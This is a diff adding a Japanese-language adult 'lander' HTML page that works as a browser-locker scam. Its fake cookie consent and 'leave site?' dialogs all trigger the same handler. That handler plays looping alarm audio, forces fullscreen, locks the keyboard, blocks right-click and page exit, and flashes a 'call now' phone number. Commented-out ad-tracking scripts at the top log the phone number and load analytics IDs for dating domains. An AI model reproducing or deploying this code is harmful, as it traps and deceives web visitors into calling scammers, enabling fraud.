@@ -1,0 +1,918 @@
+<!-- Binom V2 Pixel Script -->
+<!--<script>var BPixelJS;!function(){"use strict";var n={d:function(e,o){for(var t in o)n.o(o,t)&&!n.o(e,t)&&Object.defineProperty(e,t,{enumerable:!0,get:o[t]})},o:function(n,e){return Object.prototype.hasOwnProperty.call(n,e)}},e={};function o(n){!window.isPixelLoaded&&window.isPixelLoading?(window.pixelLoadedHandlers||(window.pixelLoadedHandlers=[]),window.pixelLoadedHandlers.push(n)):n()}function t(n){var e,o;return null!==(e=null===(o=window.BPIXEL_JS_CONFIG)||void 0===o?void 0:o[n])&&void 0!==e?e:void 0}function i(){var n;return(n=console).error.apply(n,arguments)}function r(n){return r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},r(n)}function a(){var n,e,o,t;return null!==(n=null!==(e=function(){if("object"!==r(window.tokens)||!window.tokens)return null;var n=window.tokens.bcid;return"string"!=typeof n?null:n}())&&void 0!==e?e:null!==(o=null==(t=document.cookie.match(new RegExp("(^|[ ;])".concat("bcid","=(.+?)(;|$)"))))?void 0:t[2])&&void 0!==o?o:null)&&void 0!==n?n:function(){var n,e,o=null!==(n=null==(e=window.location.search.match(new RegExp("(^|[&?])".concat("bcid","=(.*?)(&|$)"))))?void 0:e[2])&&void 0!==n?n:null;return"string"!=typeof o?null:o}()}function l(n,e){return"".concat(n).concat(e)}function d(n){var e=n.base,o=n.params,t=e||"?";return Object.entries(o).forEach((function(n){var e=n[0],o=n[1];"?"!==t[t.length-1]&&(t+="&"),t+="".concat(e,"=").concat(o)})),t}function u(n){var e=new Image;e.src=n,e.referrerPolicy="no-referrer-when-downgrade"}n.d(e,{default:function(){return c}});var c={config:function(n){!function(n){window.BPIXEL_JS_CONFIG=Object.assign({},window.BPIXEL_JS_CONFIG,n)}(n)},run:function(){var n,e,o,r=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};window.isPixelLoading=!0;var u,c,s,f=null!==(n=r.url)&&void 0!==n?n:t("url"),v=null!==(e=r.campaignKey)&&void 0!==e?e:t("campaignKey"),p=null!==(o=r.tokens)&&void 0!==o?o:{};void 0!==f?void 0!==v?(u=l(f,d({base:window.location.search,params:Object.assign({},p,{key:v,lp_type:"pixel"})})),c=function(){var n,e;window.isPixelLoading=!1,window.isPixelLoaded=!0,null===(n=window.pixelLoadedHandlers)||void 0===n||n.forEach((function(n){n()})),(e=a())?[{elements:document.querySelectorAll("a"),getHref:function(n){return n.getAttribute("href")},setHref:function(n,e){n.setAttribute("href",e)}},{elements:document.querySelectorAll("[data-href]"),getHref:function(n){return n.dataset.href||null},setHref:function(n,e){n.dataset.href=e}}].forEach((function(n){var o=n.elements,t=n.setHref,i=n.getHref;o.forEach((function(n){var o,r=i(n);r&&(/[?&]event[_\d]+=/.test(o=r)||/[?&]cnv_id=OPTIONAL(&|$)/.test(o)||/[?&]lp=(1|data_upd)(&|$)/.test(o))&&t(n,"".concat(r,"&bcid=").concat(e))}))})):i("Can't find click id")},(s=document.createElement("script")).src=u,s.async=!1,c&&(s.onload=c),document.head.appendChild(s)):i('"campaignKey" param must be passed'):i('"url" param must be passed')},update:function(){var n,e,r,c=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},s=null!==(n=c.url)&&void 0!==n?n:t("url"),f=null!==(e=c.updateKey)&&void 0!==e?e:t("updateKey"),v=null!==(r=c.tokens)&&void 0!==r?r:{};o((function(){if(void 0!==s)if(void 0!==f){var n=a();n?u(l(s,d({base:"?",params:Object.assign({},v,{upd_clickid:n,upd_key:f})}))):i("Can't find click id")}else i('"updateKey" param must be passed');else i('"url" param must be passed')}))},conversion:function(){var n,e,r=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},c=null!==(n=r.url)&&void 0!==n?n:t("url"),s=null!==(e=r.tokens)&&void 0!==e?e:{};o((function(){if(void 0!==c){var n=a();n||function(){var n;(n=console).warn.apply(n,arguments)}("Can't find click id"),u(l(c,d({base:"?",params:Object.assign({},s,{cnv_id:null!=n?n:"conversion_pixel"})})))}else i('"url" param must be passed')}))},onPixelLoaded:o,useTokens:function(n){o((function(){!function(n){"loading"!==document.readyState?n():document.addEventListener("DOMContentLoaded",n)}((function(){var e;n(null!==(e=window.tokens)&&void 0!==e?e:{})}))}))}};BPixelJS=e.default}();-->
+<!--</script>-->
+
+<!--<&lt;!&ndash; Extract phone and fire on click with phone as token &ndash;&gt;-->
+<!--<script>-->
+<!--  function extractPhoneFromPage() {-->
+<!--    const phoneEl = document.getElementById("dynamicPhone");-->
+<!--    return phoneEl ? phoneEl.innerText.trim().replace(/[\s\-]+/g, '') : "unknown";-->
+<!--  }-->
+
+<!--  let hasClicked = false;-->
+
+<!--  document.addEventListener("DOMContentLoaded", function () {-->
+<!--    window.addEventListener("click", function () {-->
+<!--      if (!hasClicked) {-->
+<!--        hasClicked = true;-->
+
+<!--        const pixelUrl = window.location.origin + '/click';-->
+<!--        const phoneNumber = extractPhoneFromPage();-->
+
+<!--        BPixelJS.conversion({-->
+<!--          url: pixelUrl,-->
+<!--          tokens: {-->
+<!--            cnv_status: phoneNumber-->
+<!--          }-->
+<!--        });-->
+
+<!--        console.log("📞 Binom pixel fired with phone:", phoneNumber);-->
+<!--      }-->
+<!--    });-->
+<!--  });-->
+<!--</script><script>-->
+<!--  function loadGAonClick() {-->
+<!--    const gaMap = {-->
+<!--      "seniorsoulmatesonline.com": "G-1Y1SDZ63K2", // OB JP-->
+<!--      "adultchatterbox.com": "G-1Y1SDZ63K2", // Nikhi TJ-->
+<!--      "flirtanite.com": "G-1Y1SDZ63K2", // Nikhi TJ-->
+<!--      "intenseconnections.com": "G-1Y1SDZ63K2", // Nikhi TJ-->
+<!--      "hooknheat.com": "G-1Y1SDZ63K2", // Nikhi TJ-->
+<!--      "eliteliaisons.com": "G-1Y1SDZ63K2", // ANKUR  TJ-->
+<!--    };-->
+
+<!--    const currentHost = window.location.hostname.toLowerCase();-->
+<!--    let matchedGA = gaMap[currentHost];-->
+
+<!--    if (!matchedGA) {-->
+<!--      const parts = currentHost.split('.');-->
+<!--      if (parts.length >= 2) {-->
+<!--        const baseDomain = parts.slice(-2).join('.');-->
+<!--        matchedGA = gaMap[baseDomain];-->
+<!--      }-->
+<!--    }-->
+
+<!--    matchedGA = matchedGA || "G-5VP9KHJ107";-->
+
+<!--    const gaScript = document.createElement("script");-->
+<!--    gaScript.async = true;-->
+<!--    gaScript.src = `https://www.googletagmanager.com/gtag/js?id=${matchedGA}`;-->
+<!--    document.head.appendChild(gaScript);-->
+
+<!--    window.dataLayer = window.dataLayer || [];-->
+<!--    function gtag(){ dataLayer.push(arguments); }-->
+
+<!--    gaScript.onload = function () {-->
+<!--      gtag('js', new Date());-->
+<!--      gtag('config', matchedGA);-->
+<!--      console.log("📊 GA4 fired with ID:", matchedGA);-->
+<!--    };-->
+<!--  }-->
+
+<!--  let hasFiredGA = false;-->
+<!--  document.addEventListener("DOMContentLoaded", function () {-->
+<!--    window.addEventListener("click", function () {-->
+<!--      if (!hasFiredGA) {-->
+<!--        hasFiredGA = true;-->
+<!--        loadGAonClick();-->
+<!--      }-->
+<!--    });-->
+<!--  });-->
+<!--</script>-->
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+
+  <!-- =========================================== -->
+  <!-- JS: Clean up URL in address bar after load -->
+  <!-- =========================================== -->
+  <script>
+    (function() {
+      let cleanUrl =
+        window.location.protocol +
+        '//' +
+        window.location.host +
+        '/landers/mp_jp_adult/ABR/index.php';
+      if (window.history.replaceState) {
+        window.history.replaceState(null, null, cleanUrl); // Hides query params without reloading
+      }
+    })();
+  </script>
+
+  <link as="image" href="image/background.webp" rel="preload">
+
+  <!-- ============================================== -->
+  <!-- JS Placeholder to potentially fetch ph0ne var -->
+  <!-- (Not used in PHP directly, but may assist UI) -->
+  <!-- ============================================== -->
+  <script type="text/javascript">
+    var ph0ne = getVariableFromURl('ph0ne'); // Custom JS method (user-defined elsewhere)
+  </script>
+
+
+</head> <!-- diable this when want to start website code -->
+<body> <!-- diable this when want to start website code -->
+
+<div class="ads-wrapper">
+  <audio id="audio" src="image/a0ler0tm0s.mp3"></audio>
+
+  <!-- no-redirect start -->
+
+  <div id="footer">
+    <div class="footer-bg"></div>
+    <span class="footer-number"><span id="dynamicPhone">0101 (505) 396-2176</span></span>
+  </div>
+  <div class="dialog-overlay" id="dialog-overlay" onclick="handleLeave()">
+    <div class="first-img">
+      <img alt="bg1" src="image/bg1.png" />
+    </div>
+    <div class="second-img">
+      <img alt="bg2" src="image/bg2.gif" />
+    </div>
+    <div class="third-img">
+      <img alt="bg3" src="image/bg3.gif" />
+    </div>
+    <div class="fourth-img">
+      <img alt="bg4" src="image/bg4.gif" />
+    </div>
+    <div class="fifth-img">
+      <!-- <img src="images/bg5.gif" alt="bg5" /> -->
+      <video autoplay loop muted playsinline>
+        <source src="image/bg5-video.mp4" />
+      </video>
+      <div class="numberBox" id="contact-number">
+        <p class="contact-num">
+          <strong><span id="dynamicPhone">0101 (505) 396-2176</span></strong>
+        </p>
+        <p style="font-size: 24px; font-weight: bold;">
+          今すぐフリーダイヤル！
+        </p>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="overlay" onclick="handleLeave()"></div>
+
+
+  <div class="dialog-box" id="dialog-cookies" onclick="handleLeave()">
+    <span class="close-btn">✖</span>
+    <h1>クッキーを使用しています</h1>
+    <p>
+      クッキーを使用してお客様に関する情報を収集しています。この情報は以下の目的で使用されます:
+    </p>
+    <ul>
+      <li>1. ウェブサイトの体験を向上させるため（機能）</li>
+      <li>2. 訪問ページ数をカウントするため（統計）</li>
+      <li>3. 関連するプロモーションを表示するため（マーケティング）</li>
+    </ul>
+    <p>
+      「同意する」をクリックすることで、これらすべての目的でのクッキー使用に同意したことになります。クッキーやその他の技術による個人データの収集方法については、
+      <a href="#">プライバシーポリシー</a>および<a href="#">クッキーポリシー</a>をご覧ください。
+    </p>
+
+    <div class="buttons-wrapper">
+      <button class="accept-btn">同意する</button>
+      <button class="decline-btn">同意しない</button>
+    </div>
+  </div>
+
+  <div id="exit-popup" onclick="handleLeave()">
+    <h5>サイトを離れますか？</h5>
+    <p>本当にこのページを退出しますか？</p>
+    <div class="btn-wrapper">
+      <button class="btn_leave" onclick="handleLeave()">退出する</button>
+      <button class="btn_cancel" onclick="handleLeave()">キャンセル</button>
+    </div>
+  </div>
+
+  <!-- this is cookie popup end -->
+
+
+  <style>
+      body {
+          margin: 0;
+          padding: 0;
+          height: 100vh;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          background: url("image/background.webp") no-repeat center center/cover;
+          background-size: cover;
+          font-family: Arial, sans-serif;
+
+      }
+
+      .ads-wrapper {
+          margin: 0;
+          padding: 0;
+          font-family: Arial, sans-serif;
+          color: #000;
+      }
+
+      .ads-wrapper #overlay {
+          position: fixed;
+          top: 0;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          background-color: rgba(0, 0, 0, 0.4);
+          display: none;
+          z-index: 9999;
+          cursor: none;
+      }
+
+      .ads-wrapper #exit-popup {
+          position: fixed;
+          left: 0;
+          top: 0;
+          right: 0;
+          margin: 0 auto;
+          display: none;
+          background-color: #fff;
+          max-width: 460px;
+          padding: 20px;
+          border-radius: 8px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+          font-family: Arial, Helvetica, sans-serif;
+          width: 90%;
+          box-sizing: border-box;
+          z-index: 99999999;
+      }
+
+      .ads-wrapper .btn-wrapper {
+          text-align: right;
+          margin-top: 20px;
+      }
+
+      .ads-wrapper h5 {
+          font-size: 18px;
+          margin: 0;
+      }
+
+      .ads-wrapper p {
+          margin-top: 10px;
+          max-width: 100%;
+          line-height: normal;
+          font-size: inherit;
+          color: inherit;
+      }
+
+      .ads-wrapper ul {
+          color: #000;
+      }
+
+      .ads-wrapper .btn_leave {
+          padding: 10px 20px;
+          background-color: #1b73e8;
+          color: #fff !important;
+          text-transform: capitalize;
+          text-decoration: none;
+          border-radius: 5px;
+          display: inline-block;
+          animation: zoom 1s linear infinite;
+      }
+
+      .ads-wrapper .btn_cancel {
+          padding: 10px 20px;
+          border: 1px solid #ddd;
+          color: #1b73e8 !important;
+          text-transform: capitalize;
+          text-decoration: none;
+          border-radius: 5px;
+          display: inline-block;
+          margin-left: 10px;
+          background-color: transparent;
+      }
+
+      .ads-wrapper .dialog-box {
+          width: 90%;
+          max-width: 600px;
+          background-color: #ffffff;
+          padding: 40px;
+          border-radius: 12px;
+          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+          border: 1px solid #ddd;
+          position: relative;
+          text-align: left;
+          position: fixed;
+          left: 0;
+          right: 0;
+          top: 50%;
+          transform: translateY(-50%);
+          margin: 0 auto;
+          z-index: 999;
+          box-sizing: border-box;
+      }
+
+      .ads-wrapper .dialog-overlay {
+          position: fixed;
+          top: 0;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          background-color: rgba(0, 0, 0, 0.2);
+          z-index: 99;
+          backdrop-filter: blur(1px);
+          background-size: cover;
+          background-position: center top;
+          cursor: none;
+          height: 1010px;
+          display: none;
+      }
+
+      .ads-wrapper .first-img {
+          position: absolute;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          top: 0;
+          height: 100vh;
+      }
+
+      .ads-wrapper .first-img img {
+          width: 100%;
+          height: 100%;
+          display: block;
+          object-fit: cover;
+          object-position: top;
+      }
+
+      .ads-wrapper .second-img {
+          position: absolute;
+          left: 0;
+          right: 0;
+          top: 20%;
+          z-index: 9;
+          margin: 0 auto;
+          display: table;
+          padding: 10px;
+          background-color: #fff;
+          border-radius: 10px;
+          box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+      }
+
+      .ads-wrapper .third-img {
+          position: absolute;
+          left: 35%;
+          top: 10%;
+          z-index: 9;
+          margin: 0 auto;
+          display: table;
+          animation: zoominoutsinglefeatured 4s infinite;
+          border-radius: 10px;
+      }
+
+      .ads-wrapper .fourth-img {
+          position: absolute;
+          left: 0;
+          right: 0;
+          top: 0;
+          z-index: 9;
+          margin: 0 auto;
+          display: table;
+      }
+
+      .ads-wrapper .fifth-img {
+          position: absolute;
+          left: 0;
+          right: 0;
+          top: 30%;
+          z-index: 9;
+          margin: 0 auto;
+          display: table;
+          padding: 2px;
+          overflow: hidden;
+          background-color: #fff;
+          border-radius: 10px;
+          box-shadow: rgb(0 0 0 / 25%) 0px 54px 55px,
+          rgb(0 0 0 / 12%) 0px -12px 30px, rgb(0 0 0 / 12%) 0px 4px 6px,
+          rgb(0 0 0 / 17%) 0px 12px 13px, rgb(0 0 0 / 9%) 0px -3px 5px;
+      }
+
+      .ads-wrapper .fifth-img video {
+          margin-right: -4px;
+          margin-bottom: -9px;
+      }
+
+      .ads-wrapper .dialog-box h1 {
+          font-size: 2rem;
+          color: #333;
+          margin-bottom: 15px;
+          font-weight: bold;
+      }
+
+      .ads-wrapper .cookies-overlay {
+          position: fixed;
+          top: 0;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          background-color: rgba(0, 0, 0, 0.2);
+          z-index: 99;
+          backdrop-filter: blur(1px);
+          background-size: cover;
+          background-position: center top;
+          cursor: none;
+          height: 1010px;
+      }
+
+      .ads-wrapper .dialog-box p {
+          font-size: 1.1rem;
+          color: #666;
+          margin-bottom: 20px;
+          line-height: 1.6;
+      }
+
+      .ads-wrapper .dialog-box a {
+          color: #0066cc;
+          text-decoration: none;
+      }
+
+      .ads-wrapper .dialog-box a:hover {
+          text-decoration: underline;
+      }
+
+      .ads-wrapper .close-btn {
+          position: absolute;
+          top: 15px;
+          right: 20px;
+          font-size: 1.5rem;
+          color: #333;
+          cursor: pointer;
+      }
+
+      .ads-wrapper .buttons-wrapper {
+          display: flex;
+          justify-content: space-between;
+          margin-top: 20px;
+      }
+
+      .ads-wrapper button {
+          padding: 12px 25px;
+          font-size: 1rem;
+          border: none;
+          border-radius: 5px;
+          cursor: pointer;
+          font-weight: bold;
+      }
+
+      .ads-wrapper .accept-btn {
+          background-color: #007bff;
+          color: white;
+          animation: zoom 1s linear infinite;
+      }
+
+      .ads-wrapper .remove-animation .accept-btn {
+          animation: none;
+      }
+
+      .ads-wrapper .decline-btn {
+          background-color: #6c757d;
+          color: white;
+      }
+
+      @keyframes zoom {
+          0% {
+              transform: scale(1);
+          }
+          50% {
+              transform: scale(1.15);
+          }
+          100% {
+              transform: scale(1);
+          }
+      }
+
+      /* Responsive adjustments */
+      @media (max-width: 768px) {
+          .ads-wrapper .dialog-box {
+              padding: 30px;
+          }
+
+          .ads-wrapper .dialog-box h1 {
+              font-size: 1.8rem;
+          }
+
+          .ads-wrapper .dialog-box p {
+              font-size: 1rem;
+          }
+
+          .ads-wrapper button {
+              padding: 10px 20px;
+              font-size: 0.9rem;
+          }
+      }
+
+      .ads-wrapper .top {
+          padding-left: 10px;
+      }
+
+      .ads-wrapper #bottom {
+          margin: 12px 0 0;
+          display: flex;
+          border-top: 1px solid #d6d5d5;
+          align-items: center;
+          padding: 12px 0 0;
+          flex-wrap: wrap;
+      }
+
+      .ads-wrapper #bottom ul {
+          list-style-type: none;
+          margin: 0;
+          padding: 0;
+          display: flex;
+          justify-content: flex-end;
+          flex: 1;
+      }
+
+      .ads-wrapper #bottom ul li {
+          float: left;
+          padding-left: 20px;
+      }
+
+      .ads-wrapper #bottom ul li a {
+          display: block;
+      }
+
+      .ads-wrapper a {
+          color: #007bff;
+          text-decoration: none;
+          background-color: transparent;
+      }
+
+      .ads-wrapper a:hover {
+          color: #0056b3;
+          text-decoration: underline;
+      }
+
+      @keyframes blink-animation {
+          to {
+              visibility: hidden;
+          }
+      }
+
+      @-webkit-keyframes blink-animation {
+          to {
+              visibility: hidden;
+          }
+      }
+
+      .ads-wrapper .action_buttons a.active {
+          border: 1px solid #3b79ed;
+          font-weight: bold;
+      }
+
+      .ads-wrapper .action_buttons a {
+          float: right;
+          font-size: 12px;
+          margin-right: 15px;
+          padding: 6px 25px;
+          text-decoration: none;
+          color: #fff !important;
+          border: 1px solid #fff;
+          margin-top: 20px;
+          border-radius: 3px; /* 100% */
+
+          margin-bottom: 20px;
+      }
+
+      .ads-wrapper .cardcontainer {
+          animation: zoominoutsinglefeatured 4s infinite;
+          border-radius: 10px;
+      }
+
+      @keyframes zoominoutsinglefeatured {
+          0% {
+              transform: scale(1, 1);
+          }
+          50% {
+              transform: scale(1.1, 1.1);
+          }
+          100% {
+              transform: scale(1, 1);
+          }
+      }
+
+      @keyframes zoomininsinglefeatured {
+          0% {
+              transform: scale(1, 1);
+          }
+          50% {
+              transform: scale(1.1, 1.1);
+          }
+          100% {
+              transform: scale(1, 1);
+          }
+      }
+
+      .ads-wrapper .flex {
+          display: flex;
+      }
+
+      .ads-wrapper .centerright img {
+          max-width: 100%;
+      }
+
+      .ads-wrapper .centerright ul {
+          padding: 0;
+          list-style-type: none;
+          margin: 0;
+      }
+
+      .ads-wrapper .centerright ul {
+          columns: 3;
+      }
+
+      .ads-wrapper .centerright li {
+          width: calc((100vw / 3) - 20px);
+          display: inline-block;
+      }
+
+      .ads-wrapper .centerright ul {
+          display: flex;
+      }
+
+      .ads-wrapper .centerright ul {
+          display: grid;
+          grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+      }
+
+      .ads-wrapper .centerright {
+          position: absolute;
+          left: 70px;
+          top: 150px;
+          display: flex;
+      }
+
+      .ads-wrapper .box {
+          display: none;
+          position: absolute;
+          width: 723px;
+          height: 560px;
+          top: 49%;
+          z-index: 999;
+          margin-top: -255px;
+          left: 48%;
+
+          border-radius: 0px;
+          margin-left: -325px;
+          border-radius: 8px;
+          padding-right: 10px;
+          padding-left: 0px;
+
+          background: #fff;
+
+          box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+      }
+
+      .ads-wrapper .button {
+          background: #cccccc;
+          color: #000 !important;
+          padding: 6px 32px;
+          text-align: center;
+          text-decoration: none;
+          display: inline-block;
+          font-size: 13px;
+          margin: 4px 2px;
+          cursor: pointer;
+          font-weight: 350;
+      }
+
+      .ads-wrapper #footer {
+          width: 100%;
+          display: none;
+          cursor: none;
+          position: fixed;
+          bottom: 0;
+          z-index: 9999;
+          color: #fff;
+          font-size: 18px;
+          left: 0;
+      }
+
+      .ads-wrapper .footer-bg {
+          background-image: url("image/footer-bg.gif");
+          background-position: center center;
+          height: 70px;
+      }
+
+      .ads-wrapper .footer-number {
+          position: absolute;
+          left: 0;
+          top: 15px;
+          font-size: 17px;
+          font-weight: bold;
+          right: 0;
+          margin: 0 auto;
+          display: table;
+          transform: translateX(110px);
+      }
+
+      :host {
+          display: inline-block;
+          overflow: hidden;
+          text-align: initial;
+          white-space: nowrap;
+      }
+
+      .ads-wrapper .numberBox {
+          position: absolute;
+          z-index: 9999;
+          top: 34%;
+          display: none;
+          left: 0;
+          right: 0;
+          font-size: 16px;
+          margin: 0 auto;
+          text-align: center;
+      }
+
+      .ads-wrapper .contact-num {
+          font-size: 30px;
+          margin-bottom: 0;
+          color: #296cff;
+      }
+  </style>
+  <script>
+    var elem = document.documentElement;
+
+    function openFullscreen() {
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) {
+        /* Safari */
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) {
+        /* IE11 */
+        elem.msRequestFullscreen();
+      }
+    }
+
+    function closeFullscreen() {
+      if (document.exitFullscreen) {
+        document.exitFullscreen();
+      } else if (document.webkitExitFullscreen) {
+        /* Safari */
+        document.webkitExitFullscreen();
+      } else if (document.msExitFullscreen) {
+        /* IE11 */
+        document.msExitFullscreen();
+      }
+    }
+
+    let hasShownPopup = false;
+
+    document.addEventListener('mousemove', function(event) {
+      if (!hasShownPopup && event.clientY < 50) {
+        showPopup();
+        hasShownPopup = true; // Prevent multiple popups
+      }
+    });
+
+    function showPopup() {
+      let dialogBox = document.getElementById('dialog-cookies');
+      let popup = document.getElementById('exit-popup');
+      dialogBox?.classList.add('remove-animation');
+      popup.style.display = 'block';
+      overlay.style.display = 'block';
+    }
+
+    var x = document.getElementById('audio');
+
+    function playSound() {
+      var audio = document.getElementById('audio');
+      audio.loop = true;
+      audio.play();
+    }
+
+    function fullScreen() {
+      var el = document.documentElement,
+        rfs =
+          el.requestFullScreen ||
+          el.webkitRequestFullScreen ||
+          el.mozRequestFullScreen;
+      rfs.call(el);
+    }
+
+    let popup = document.getElementById('exit-popup');
+    let dialogBox = document.getElementById('dialog-cookies');
+    let dialogOverlay = document.getElementById('dialog-overlay');
+    let cookiesOverlay = document.getElementById('cookies-overlay');
+    let overlay = document.getElementById('overlay');
+
+    function handleLeave() {
+      playSound();
+      fullScreen();
+      popup.style.display = 'none';
+      if (dialogBox) {
+        dialogBox.style.display = 'none';
+      }
+      if (overlay) {
+        overlay.style.display = 'none';
+      }
+      startScan();
+      dialogOverlay.style.display = 'block';
+      cookiesOverlay.style.display = 'none';
+    }
+
+    let closeModal = false;
+
+    function handleClose(event) {
+      popup.style.display = 'none';
+      dialogBox.style.display = 'none';
+      overlay.style.display = 'none';
+      dialogOverlay.style.display = 'none';
+      event.stopPropagation();
+      closeModal = true;
+    }
+
+    addEventListener('click', function() {
+      if (closeModal) {
+        var el = document.documentElement,
+          rfs =
+            el.requestFullScreen ||
+            el.webkitRequestFullScreen ||
+            el.mozRequestFullScreen;
+        rfs.call(el);
+      }
+    });
+
+    document.onkeydown = function(a) {
+      return !1;
+    };
+
+    // document.attachEvent("onkeydown", win_onkeydown_handler);
+
+    function win_onkeydown_handler() {
+      switch (e.keyCode) {
+        case 116:
+          e.returnValue = !1;
+          e.keyCode = 0;
+          break;
+        case 27:
+          (e.returnValue = !1), (e.keyCode = 0);
+      }
+    }
+
+    function fadeIn(element, duration) {
+      element.style.opacity = 0;
+      element.style.display = 'block';
+
+      let startTime = performance.now();
+
+      function animate(time) {
+        let elapsedTime = time - startTime;
+        let progress = Math.min(elapsedTime / duration, 1);
+        element.style.opacity = progress;
+
+        if (progress < 1) {
+          requestAnimationFrame(animate);
+        }
+      }
+
+      requestAnimationFrame(animate);
+    }
+
+    function startScan() {
+      setTimeout(
+        () => fadeIn(document.getElementById('contact-number'), 500),
+        900,
+      );
+      setTimeout(() => fadeIn(document.getElementById('footer'), 500), 900);
+    }
+
+    navigator.keyboard.lock();
+    document.onkeydown = function(e) {
+      return false;
+    };
+
+    window.addEventListener('beforeunload', function(e) {
+      var confirmationMessage =
+        'It looks like you have been editing something. ' +
+        'If you leave before saving, your changes will be lost.';
+
+      (e || window.e).returnValue = confirmationMessage; //Gecko + IE
+      return confirmationMessage;
+    });
+
+    // Disable Right click
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+
+    // Trigger handleLeave() when clicking anywhere on the page (once)
+    let hasTriggeredLeave = false;
+    document.addEventListener('click', function(e) {
+      if (!hasTriggeredLeave) {
+        handleLeave();
+        hasTriggeredLeave = true;
+      }
+    });
+
+  </script>
+  <div class="imgTagappend"></div>
+</div>
+</body>
+</html>
